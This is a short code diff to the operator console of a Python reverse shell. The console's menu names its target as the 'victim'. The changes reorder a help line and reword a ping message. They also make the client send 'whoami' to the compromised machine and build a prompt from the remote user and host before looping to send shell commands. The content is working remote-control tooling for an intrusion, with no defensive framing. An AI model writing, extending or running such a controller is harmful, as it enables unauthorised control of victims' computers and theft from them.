@@ -13,8 +13,8 @@ pipe = f'{Fore.LIGHTBLUE_EX} | {Fore.RESET}'
 commands = f'''
 help{pipe}Prints this menu
 cls - clear{pipe}Clears this console
-exit - close{pipe}Closes this client and connection
 stop{pipe}Stops the reverse shell on {victim}
+exit - close{pipe}Closes this client and connection
 ping{pipe}Gives you the TCP connect latency between you and the {victim}
 '''
 
@@ -35,16 +35,26 @@ def ping():
             s.close()
     if pings:
         avg = sum(pings) / len(pings)
-        print(f"Average TCP RTT: {avg:.2f} ms")
+        print(f"Average ping: {avg:.2f} ms")
     else:
         print("No TCP replies received.")
 
 try:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((server_ip, server_port))
+    sock.sendall(b'whoami')
+    response = sock.recv(1024).decode().replace("\r\n", "")
+    if '\\' in response:
+        parts = response.split('\\')
+        desktop = parts[0]
+        user = parts[1]
+        input_text = f'[{user}@{desktop}] > '
+    else:
+        input_text = f'[{response}] > '
+
     
     while True:
-        command = input("> ").strip()
+        command = input(input_text).strip()
         if not command:
             continue
         
